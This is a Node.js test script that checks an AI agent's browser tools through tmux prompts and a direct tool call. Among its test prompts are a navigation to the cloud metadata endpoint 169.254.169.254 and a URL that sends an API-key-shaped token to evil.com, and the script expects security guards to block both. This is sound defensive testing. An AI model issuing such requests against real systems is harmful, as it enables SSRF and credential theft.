#!/usr/bin/env node
/**
 * Live Camofox browser verification for mya.
 *
 * Usage:
 *   CAMOFOX_URL=http://localhost:9377 node scripts/browser-engine-tui-check.mjs
 *   CAMOFOX_URL=http://localhost:9377 node scripts/browser-engine-tui-check.mjs tui
 *   CAMOFOX_URL=http://localhost:9377 node scripts/browser-engine-tui-check.mjs direct
 *
 * TUI mode sends the natural-language browser checklist to a detached tmux
 * session. Direct mode calls browserNavigateTool from the built public tools
 * barrel and is the deterministic Camofox wiring check.
 */

import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const SCRIPT_DIR = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(process.env.MYA_REPO_ROOT ?? join(SCRIPT_DIR, ".."));
const SESSION_NAME = process.env.MYA_TUI_SESSION ?? "mya-browser-engine-check";
const DIST_MYA = join(REPO_ROOT, "dist", "mya.js");
const SOURCE_MYA = join(REPO_ROOT, "packages", "print", "src", "main.ts");
const MYA_COMMAND = existsSync(DIST_MYA)
  ? ["node", DIST_MYA]
  : ["npx", "tsx", SOURCE_MYA];
const CAMOFOX_URL = process.env.CAMOFOX_URL?.trim() ?? "";

function envSet(name) {
  return typeof process.env[name] === "string" && process.env[name].trim().length > 0;
}

const CLOUD_CONFIGURED =
  (envSet("BROWSERBASE_API_KEY") && envSet("BROWSERBASE_PROJECT_ID")) ||
  envSet("BROWSER_USE_API_KEY") ||
  (envSet("BROWSER_USE_GATEWAY_URL") && envSet("BROWSER_USE_OAUTH_TOKEN"));

const COLORS = {
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  dim: "\x1b[2m",
  bold: "\x1b[1m",
  reset: "\x1b[0m",
};

function heading(text) {
  console.log(`\n${COLORS.bold}${COLORS.cyan}═══ ${text} ═══${COLORS.reset}\n`);
}

function info(text) {
  console.log(`${COLORS.cyan}  ℹ${COLORS.reset} ${text}`);
}

function pass(text, detail = "") {
  console.log(
    `${COLORS.green}  ✓ PASS${COLORS.reset} ${text}${detail ? ` ${COLORS.dim}— ${detail}${COLORS.reset}` : ""}`,
  );
}

function fail(text, detail = "") {
  console.log(
    `${COLORS.red}  ✗ FAIL${COLORS.reset} ${text}${detail ? ` ${COLORS.dim}— ${detail}${COLORS.reset}` : ""}`,
  );
}

/** Run tmux without a shell so prompts and paths cannot be shell-expanded. */
function tmux(args, timeoutMs = 5_000) {
  try {
    return execFileSync("tmux", args, {
      encoding: "utf8",
      timeout: timeoutMs,
      stdio: ["ignore", "pipe", "pipe"],
    });
  } catch {
    return null;
  }
}

function tmuxAvailable() {
  return tmux(["-V"]) !== null;
}

function sessionExists() {
  const sessions = tmux(["list-sessions", "-F", "#{session_name}"]) ?? "";
  return sessions.split("\n").some((name) => name.trim() === SESSION_NAME);
}

function capturePane(lines = 120) {
  return (
    tmux([
      "capture-pane",
      "-p",
      "-t",
      SESSION_NAME,
      "-S",
      `-${lines}`,
    ]) ?? ""
  );
}

function shellQuote(value) {
  return `'${value.replaceAll("'", "'\\''")}'`;
}

/** Start mya in a detached session, or reuse the named session if present. */
function ensureSession() {
  if (sessionExists()) {
    info(`Reusing tmux session "${SESSION_NAME}".`);
    return true;
  }

  const command = MYA_COMMAND.map(shellQuote).join(" ");
  info(`Creating tmux session "${SESSION_NAME}" with ${MYA_COMMAND[0]}...`);
  const started = tmux(
    [
      "new-session",
      "-d",
      "-s",
      SESSION_NAME,
      "-c",
      REPO_ROOT,
      "-e",
      `CAMOFOX_URL=${CAMOFOX_URL}`,
      command,
    ],
    10_000,
  );
  if (started === null) {
    fail(`could not create tmux session "${SESSION_NAME}"`);
    return false;
  }
  info(`Attach in another terminal with: tmux attach -t ${SESSION_NAME}`);
  return true;
}

function sleep(ms) {
  return new Promise((resolvePromise) => setTimeout(resolvePromise, ms));
}

async function waitForStablePane(stableMs = 2_500, maxWaitMs = 60_000) {
  const intervalMs = 500;
  let previous = capturePane();
  let stableFor = 0;
  const startedAt = Date.now();

  while (Date.now() - startedAt < maxWaitMs) {
    await sleep(intervalMs);
    const current = capturePane();
    if (current === previous) {
      stableFor += intervalMs;
      if (stableFor >= stableMs) return current;
    } else {
      previous = current;
      stableFor = 0;
    }
  }
  return capturePane();
}

/** Send literal text and Enter; no shell quoting is involved. */
async function sendPrompt(prompt, graceMs) {
  const before = capturePane();
  tmux(["send-keys", "-t", SESSION_NAME, "-l", prompt]);
  tmux(["send-keys", "-t", SESSION_NAME, "Enter"]);
  await sleep(graceMs);
  const after = await waitForStablePane();
  return { before, after, evidence: paneEvidence(before, after, prompt) };
}

function paneEvidence(before, after, prompt) {
  const promptAt = after.lastIndexOf(prompt);
  if (promptAt >= 0) return after.slice(promptAt + prompt.length);
  if (after.startsWith(before)) return after.slice(before.length);
  return after;
}

function redact(text) {
  return text
    .replace(/sk-ant-[A-Za-z0-9_-]+/gi, "sk-ant-[REDACTED]")
    .replace(/(key=)[^&\s]+/gi, "$1[REDACTED]")
    .replace(/(Authorization\s*:\s*Bearer\s+)[^\s,}]+/gi, "$1[REDACTED]");
}

function printPaneEvidence(text) {
  const lines = redact(text).split("\n").filter(Boolean);
  if (lines.length === 0) {
    info("Captured pane output was empty; attach to tmux to inspect the live session.");
    return;
  }
  console.log(`${COLORS.dim}  Captured pane tail:${COLORS.reset}`);
  for (const line of lines.slice(-12)) console.log(`${COLORS.dim}    ${line}${COLORS.reset}`);
}

function hasToolCall(text, name) {
  return new RegExp(`\\b${name}\\b`, "i").test(text);
}

function hasAriaRef(text) {
  return /@e\d+/i.test(text);
}

function hasClickRef(text) {
  return /browser_click[\s\S]{0,300}@e\d+|@e\d+[\s\S]{0,300}browser_click/i.test(text);
}

function engineFromText(text) {
  const explicit = text.match(/engine["']?\s*[:=]\s*["']?(camofox|cloud|local)/i);
  if (explicit?.[1]) return explicit[1].toLowerCase();
  if (/camofox/i.test(text)) return "camofox";
  if (/lightpanda|agent-browser|sidecar|\blocal\b/i.test(text)) return "local";
  if (/browserbase|browser-use|\bcloud\b/i.test(text)) return "cloud";
  return undefined;
}

function engineDetail(engine) {
  return engine ? `engine=${engine}` : "engine=not reported";
}

/*
 * Keep the configured endpoint visible beside the captured tool output. The
 * browser result identifies the selected engine; the endpoint identifies the
 * Camofox REST service that served that call. This is intentionally printed
 * only as evidence and never includes CAMOFOX_API_KEY.
 */
function printCamofoxEvidence(engine) {
  if (engine !== "camofox") return;
  info(`Camofox tool-call endpoint evidence: ${CAMOFOX_URL}`);
}

const TUI_STEPS = [
  {
    label: "browser_navigate: example.com",
    prompt:
      "Navigate to https://example.com. After using the browser tool, report the selected engine and confirm the configured Camofox endpoint.",
    graceMs: 15_000,
    evidence(text) {
      return {
        ok:
          hasToolCall(text, "browser_navigate") &&
          /example domain/i.test(text),
        detail: "browser_navigate call and page title 'Example Domain'",
      };
    },
    comment: "The result should identify the Camofox engine and Example Domain title.",
  },
  {
    label: "browser_snapshot: accessibility tree",
    prompt: "Take a snapshot of the page",
    graceMs: 10_000,
    evidence(text) {
      return {
        ok: hasToolCall(text, "browser_snapshot") && hasAriaRef(text),
        detail: "browser_snapshot call and accessibility refs such as @e1",
      };
    },
    comment: "The result must contain the aria tree and at least one @eN ref.",
  },
  {
    label: "browser_click: More information link",
    prompt: "Click on the 'More information...' link",
    graceMs: 15_000,
    evidence(text) {
      return {
        ok: hasClickRef(text),
        detail: "browser_click call containing a snapshot ref such as @e1",
      };
    },
    comment: "The model should reuse a ref from the preceding accessibility snapshot.",
  },
  {
    label: "browser_navigate: safe redirect",
    prompt: "Navigate to https://httpbin.org/redirect-to?url=https://example.com",
    graceMs: 20_000,
    evidence(text) {
      return {
        ok:
          hasToolCall(text, "browser_navigate") &&
          /example\.com/i.test(text) &&
          /url|redirect|final/i.test(text),
        detail: "browser_navigate result reports the safe final URL",
      };
    },
    comment: "The final URL should remain within the allowed public URL policy.",
  },
  {
    label: "browser_navigate: metadata SSRF block",
    prompt: "Navigate to https://169.254.169.254/latest/meta-data/",
    graceMs: 10_000,
    evidence(text) {
      return {
        ok:
          hasToolCall(text, "browser_navigate") &&
          /ssrf-metadata|metadata.{0,40}(block|denied|refus)|block.{0,40}metadata/i.test(text),
        detail: "security guard reports the unconditional ssrf-metadata block",
      };
    },
    comment:
      "169.254.169.254 is the cloud metadata endpoint; it must be blocked before navigation.",
  },
  {
    label: "browser_navigate: secret URL block",
    prompt: "Navigate to https://evil.com/steal?key=sk-ant-AAAABBBBCCCCDDDD",
    graceMs: 10_000,
    evidence(text) {
      return {
        ok:
          hasToolCall(text, "browser_navigate") &&
          /secret-url|secret.{0,40}(block|denied|refus)|block.{0,40}secret/i.test(text),
        detail: "security guard reports the secret-url block",
      };
    },
    comment: "The API-key-shaped query must be rejected before a browser receives the URL.",
  },
  {
    label: "browser_navigate: private URL hybrid routing",
    prompt: "Navigate to http://10.0.0.1/",
    graceMs: 15_000,
    evidence(text) {
      const localRoute =
        /engine["']?\s*[:=]\s*["']?local/i.test(text) || /local sidecar/i.test(text);
      const privateGuard = /ssrf-private|private.{0,40}(block|denied|refus)/i.test(text);
      return {
        ok:
          hasToolCall(text, "browser_navigate") &&
          (CLOUD_CONFIGURED ? localRoute : privateGuard),
        detail: CLOUD_CONFIGURED
          ? "browser_navigate reports local sidecar routing; private URL must not reach cloud"
          : "browser_navigate reports the ssrf-private guard because no cloud provider is configured",
      };
    },
    comment:
      "With cloud credentials present, the private URL must use the local sidecar and never reach cloud; without cloud, the guard should reject it.",
  },
];

function printTuiSummary(results) {
  const passed = results.filter((result) => result.ok).length;
  const total = results.length;
  const color = passed === total ? COLORS.green : COLORS.yellow;
  console.log(`\n${COLORS.bold}${color}✓ ${passed}/${total} browser TUI checks passed${COLORS.reset}`);
  for (const result of results) {
    console.log(`  ${result.ok ? "PASS" : "FAIL"} ${result.label} (${engineDetail(result.engine)})`);
  }
  return { passed, total };
}

async function runTuiChecks() {
  heading("Camofox browser TUI checks (tmux)");
  info(`CAMOFOX_URL=${CAMOFOX_URL}`);
  info(`Hybrid routing cloud credentials configured: ${CLOUD_CONFIGURED ? "yes" : "no"}`);
  const results = [];
  let observedEngine;

  if (!tmuxAvailable()) {
    fail("tmux is available");
    for (const step of TUI_STEPS) {
      fail(step.label, "not run because tmux is unavailable");
      results.push({ ok: false, label: step.label, engine: undefined });
    }
    return printTuiSummary(results);
  }
  pass("tmux is available");

  if (!ensureSession()) {
    for (const step of TUI_STEPS) {
      fail(step.label, "not run because the TUI session could not start");
      results.push({ ok: false, label: step.label, engine: undefined });
    }
    return printTuiSummary(results);
  }

  await sleep(8_000);
  if (capturePane(20).trim().length < 5) {
    fail("mya TUI pane has output", `inspect with: tmux attach -t ${SESSION_NAME}`);
    for (const step of TUI_STEPS) {
      fail(step.label, "not run because the TUI pane is empty");
      results.push({ ok: false, label: step.label, engine: undefined });
    }
    return printTuiSummary(results);
  }
  pass("mya TUI started in tmux session");

  for (const [index, step] of TUI_STEPS.entries()) {
    heading(`CHECK ${index + 1}/${TUI_STEPS.length} — ${step.label}`);
    info(`Prompt: ${step.prompt}`);
    info(`Checkpoint: ${step.comment}`);

    const { evidence } = await sendPrompt(step.prompt, step.graceMs);
    printPaneEvidence(evidence);
    const checkpoint = step.evidence(evidence);
    const reportedEngine = engineFromText(evidence);
    if (reportedEngine) observedEngine = reportedEngine;
    const engine = reportedEngine ?? observedEngine;
    printCamofoxEvidence(engine);
    const detail = `${checkpoint.detail}; ${engineDetail(engine)}`;
    if (checkpoint.ok) pass(step.label, detail);
    else fail(step.label, `expected evidence: ${detail}`);
    results.push({ ok: checkpoint.ok, label: step.label, engine });
  }

  info(`Session remains available for inspection: tmux attach -t ${SESSION_NAME}`);
  return printTuiSummary(results);
}

/** Same context factory used by scripts/tui-browser-check.mjs. */
function mockTurnContext(workspace) {
  return {
    workspace,
    mode: "Allow",
    approval: { async request() { return { decision: "Allow" }; } },
    emit() {},
    audit: { append() {} },
  };
}

function isRecord(value) {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function resultSummary(result) {
  try {
    return redact(JSON.stringify(result?.output ?? result)).slice(0, 240);
  } catch {
    return String(result).slice(0, 240);
  }
}

async function withTimeout(promise, timeoutMs) {
  let timer;
  try {
    return await Promise.race([
      promise,
      new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`timeout after ${timeoutMs}ms`)), timeoutMs);
      }),
    ]);
  } finally {
    if (timer) clearTimeout(timer);
  }
}

/**
 * Deterministic non-TUI Camofox check. Unlike the existing broad smoke check,
 * this deliberately requires a successful REST-backed Camofox result.
 */
async function runDirectCheck() {
  heading("Direct Camofox browser_navigate check");
  info(`CAMOFOX_URL=${CAMOFOX_URL}`);
  const results = [];

  let tools;
  try {
    tools = await import(join(REPO_ROOT, "packages", "tools", "dist", "index.js"));
    pass("imported packages/tools/dist/index.js");
  } catch (error) {
    fail(
      "imported packages/tools/dist/index.js",
      error instanceof Error ? error.message : String(error),
    );
    results.push({ ok: false, label: "import tools barrel", engine: undefined });
    printDirectSummary(results);
    return { passed: 0, total: results.length };
  }

  const tool = tools.browserNavigateTool;
  if (!tool || typeof tool.run !== "function") {
    fail("browserNavigateTool.run()", "missing browserNavigateTool from packages/tools/dist/index.js");
    results.push({ ok: false, label: "browserNavigateTool.run()", engine: undefined });
    printDirectSummary(results);
    return { passed: 0, total: results.length };
  }

  const context = mockTurnContext(REPO_ROOT);
  const args = {
    url: "https://example.com",
    taskId: "camofox-direct",
  };
  let result;
  try {
    result = await withTimeout(tool.run(args, context), 60_000);
    pass("browserNavigateTool.run() did not throw");
  } catch (error) {
    fail(
      "browserNavigateTool.run() did not throw",
      error instanceof Error ? error.message : String(error),
    );
    results.push({ ok: false, label: "browserNavigateTool.run() did not throw", engine: undefined });
    printDirectSummary(results);
    return { passed: 0, total: results.length };
  }

  const output = isRecord(result) && isRecord(result.output) ? result.output : undefined;
  const engine = typeof output?.engine === "string" ? output.engine : undefined;
  const snapshot = typeof output?.snapshot === "string" ? output.snapshot : "";
  const resultOk = isRecord(result) && result.ok === true;
  const engineOk = engine === "camofox";
  const snapshotOk = snapshot.trim().length > 0;

  results.push({ ok: true, label: "browserNavigateTool.run() did not throw", engine });

  // Print a bounded tool-call evidence record. It keeps the endpoint visible
  // without dumping a potentially large snapshot or any configured API key.
  console.log(
    `${COLORS.dim}  Tool-call output evidence: ${JSON.stringify({
      engine,
      snapshotLength: snapshot.length,
      camofoxUrl: CAMOFOX_URL,
    })}${COLORS.reset}`,
  );
  if (engineOk) {
    // Keep this exact assertion text for automated acceptance checks.
    pass("result.ok === true and output.engine === 'camofox'", "output.engine === 'camofox'");
  } else {
    fail(
      "result.ok === true and output.engine === 'camofox'",
      `result.ok=${String(resultOk)}, output.engine=${String(engine)}`,
    );
  }
  results.push({
    ok: resultOk && engineOk,
    label: "result.ok === true and output.engine === 'camofox'",
    engine,
  });

  if (snapshotOk) {
    pass("output.snapshot is non-empty", `snapshotLength=${snapshot.length}`);
  } else {
    fail("output.snapshot is non-empty", `tool result: ${resultSummary(result)}`);
  }
  results.push({ ok: snapshotOk, label: "output.snapshot is non-empty", engine });

  printDirectSummary(results);
  return { passed: results.filter((resultItem) => resultItem.ok).length, total: results.length };
}

function printDirectSummary(results) {
  const passed = results.filter((result) => result.ok).length;
  const total = results.length;
  const color = passed === total ? COLORS.green : COLORS.yellow;
  console.log(`${COLORS.bold}${color}✓ ${passed}/${total} direct Camofox checks passed${COLORS.reset}`);
  for (const result of results) {
    console.log(`  ${result.ok ? "PASS" : "FAIL"} ${result.label} (${engineDetail(result.engine)})`);
  }
  return { passed, total };
}

async function main() {
  // This guard intentionally runs before mode parsing or any fallback. A
  // missing endpoint is a configuration error, not a local-browser smoke test.
  if (!CAMOFOX_URL) {
    console.error("CAMOFOX_URL is required; set it to the Camofox REST endpoint (for example, http://localhost:9377).");
    process.exitCode = 2;
    return;
  }

  const mode = process.argv[2] ?? "tui";
  if (mode !== "tui" && mode !== "direct") {
    console.error("Usage: node scripts/browser-engine-tui-check.mjs [tui|direct]");
    process.exitCode = 2;
    return;
  }

  const summary = mode === "direct" ? await runDirectCheck() : await runTuiChecks();
  if (summary.passed < summary.total) process.exitCode = 1;
}

main().catch((error) => {
  console.error(`${COLORS.red}FATAL:${COLORS.reset} ${error instanceof Error ? error.message : String(error)}`);
  process.exitCode = 1;
});
